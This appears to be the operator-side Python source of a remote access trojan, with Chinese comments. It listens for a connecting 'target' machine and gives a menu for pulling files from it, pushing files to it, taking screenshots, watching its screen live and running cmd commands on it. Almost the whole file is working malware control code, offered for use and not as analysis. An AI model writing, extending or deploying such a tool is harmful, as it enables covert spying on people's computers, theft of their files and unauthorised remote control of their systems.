
import socket
import os,time,struct,cv2

import numpy as np
#from pynput.keyboard import Key, Controller,Listener
ip = "" 
port = 6369  # 设置端口
from threading import Thread
print('''
@recv xx.xx     下载文件
@upload xx.xx   上传文件
@screenshots     截屏
@see            窥屏
$xx             执行cmd命令
''')
while 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.listen(10)
    conn, addr = s.accept()
    print("新的连接：",addr)
    
    while True:
        try:
            conn.send(bytes("249", encoding="gbk")) 
            datas=conn.recv(1024)
            print("接收到的第一份数据：",datas,"大小：",len(datas))
            recv_data=str(datas,encoding="gbk")
            if recv_data=="ojbk":
                print("命令执行完毕")
            else:
                print("[target]:",recv_data)
            if len(datas)<=0 or datas=="\n" or datas=="\r" or datas=="":
                print("接收到了空数据")
            data=input("command:")
            cmdline=data.split(" ",1)

            conn.send(bytes(data, encoding="gbk"))
            if cmdline[0]=="@recv":
                    recv_file=os.path.basename(data.replace("@recv ",""))
                    print("recv file<----"+recv_file)
                    conn.send(bytes("startrecv", encoding="gbk"))
                    print("开始接受")
                    recvd_size = 0 

                    file_size=conn.recv(1024)
                    print("43行file_size的值是",file_size)
                    print(file_size.isdigit())
                    if file_size.isdigit()==True:

                        if file_size!=b"no_file":

                            file_size=int(file_size)
                            print("45行：file_size",file_size)
                            print("46行：fp",os.path)
                            fp = open("./"+recv_file+".bak", 'ab')#ab追加 wb覆盖

                            print("recv size:",file_size)
                            while not recvd_size == file_size:
                                print("recvd_size的值：",recvd_size,"file_size的值：",file_size)
                                if file_size - recvd_size > 1024:
                                    data = conn.recv(1024)
                                    recvd_size += len(data)
                                else:
                                    data = conn.recv(file_size - recvd_size)
                                    recvd_size = file_size
                                print(data)
                                fp.write(data)
                                conn.send(bytes("up!up!", encoding="gbk"))        
                            print("文件接受关闭")
                            fp.close()
                            conn.send(bytes("success", encoding="gbk"))
                        conn.send(bytes("ojbk", encoding="gbk"))
                    else:
                        print("文件传输错误，主动断开")

                        conn.close() 
                        s.close()
                        break
            elif  cmdline[0]=="@upload":
                    send_file=data.replace("@upload ","")
                    print("you try upload file--->"+send_file)
                    if os.path.isfile(send_file):
                                # 定义文件头信息，包含文件名和文件大小
                                #fhead_msg = struct.pack(str(len(send_file))+"s", os.path.basename(send_file).encode("utf-8"))
                        redat=conn.recv(1024)
                        print(redat)
                        if redat==b'ok':
                            print("start send")
                            file_quality=str(os.stat(send_file).st_size).encode("gbk")
                            print(file_quality)
                            conn.send(file_quality)
                            with open(send_file,'rb') as f:
                                    # 按每一段分割文件上传
                                    for i in f:
                                        conn.send(i)
                                        # 等待接收完成标志.
                                        print("一段数据：\n\n")
                                        print(i)
                                        # 判断是否真正接收完成
                                        if conn.recv(1024) == b'success':
                                            break
                        else:
                            print("target return other message")
                    else:
                            data2="文件不存在"
                            print(data2)
                            conn.send(bytes("no_file",encoding="gbk"))
            elif cmdline[0]=="@see":#未验证
                try:
                    print("start remote desktop")
                    while True:
                        conn.send(bytes("249see", encoding="gbk")) 
                        print("fa送一次数据")
                        # 接受客户端消息,设置一次最多接受10240字节的数据
                        recv_msg = conn.recv(102400)
                        # 把接收到的东西解码
                        print("115行recv_msg大小：",len(recv_msg))
                        msg = np.frombuffer(recv_msg, np.uint8)
                        print("117 line size of msg:",len(msg))
                        img_decode = cv2.imdecode(msg, cv2.IMREAD_COLOR)
                        

                        cv2.imshow(str(addr), img_decode)

                        cv2.waitKey(100)
                    s.send(bytes("249", encoding="gbk")) 
                    print("see disconnect")
                except:
                    conn.close() 
                    s.close()
                    break



        except ConnectionAbortedError:
            print("连接已断开")
#
      #      time.sleep(1)
            conn.close() 
            s.close()
            break
        except ConnectionResetError:
            print("对方断开了连接。ConnectionRefusedError")
#
      #      time.sleep(1)
            conn.close() 
            s.close()
            break


    time.sleep(3)

